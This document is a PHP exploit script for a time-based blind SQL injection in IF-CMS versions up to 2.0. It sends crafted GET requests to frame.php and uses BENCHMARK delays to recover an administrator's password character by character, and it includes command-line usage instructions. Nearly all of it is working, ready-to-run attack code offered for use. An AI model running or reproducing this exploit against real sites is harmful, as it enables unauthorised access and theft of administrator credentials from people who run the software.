--+++=======================================================+++--
--+++====== IF-CMS <= 2.0 Blind SQL Injection Exploit ======+++--
--+++=======================================================+++--

<?php

function query ($username, $char, $pos)
{
	//Increase benchmark when exploit prints uncorrect passwords

	$query = "x' OR IF ((ASCII(SUBSTRING((SELECT pass FROM rns_admin WHERE ".
		 "nick = '{$username}'),{$pos},1))={$char}), BENCHMARK(100000000,CHAR(0)),0) OR '1' = '2";
	$query = str_replace (" ", "%20", $query);
	$query = str_replace ("'", "%27", $query);
	return $query;
}

function exploit ($hostname, $path, $username, $char, $pos)
{
	$char = ord ($char);
	$fp = fsockopen ($hostname, 80);
	$get =  "GET {$path}/frame.php?id=". query ($username, $char, $pos) . " HTTP/1.1\r\n".
		"Host: {$hostname}\r\n".
		"Connection: Close\r\n\r\n";
		$a = time ();
	fputs ($fp, $get);
	while (!feof ($fp))
		fgets ($fp, 1024);

	fclose ($fp);
	$a = time () - $a;
	if ($a > 4)
		return true;
	else
		return false;

}

function usage ()
{
	echo "\nIF-CMS <= 2.0 Blind SQL Injection Exploit".
	     "\n[+] Author  : darkjoker".
	     "\n[+] Site    : http://darkjoker.net23.net".
	     "\n[+] Download: http://downloads.sourceforge.net/if-cms/If-CMS-2.07.zip?modtime=1088812800&big_mirror=0".
	     "\n[+] Usage   : php xpl.php <hostname> <path> <username>".
	     "\n[+] Ex.     : php xpl.php www.example.com /IF-CMS root".
	     "\n\n";
	exit ();
}

if ($argc != 4)
	usage ();
$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
//Edit this keylist when returned password is incomplete and add other characters you want
$key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$chr = 0;
$pos = 1;
echo "[+] Password: ";
while ($chr < strlen ($key))
{
	if (exploit ($hostname, $path, $user, $key [$chr], $pos))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}
echo "\n\n";
?>
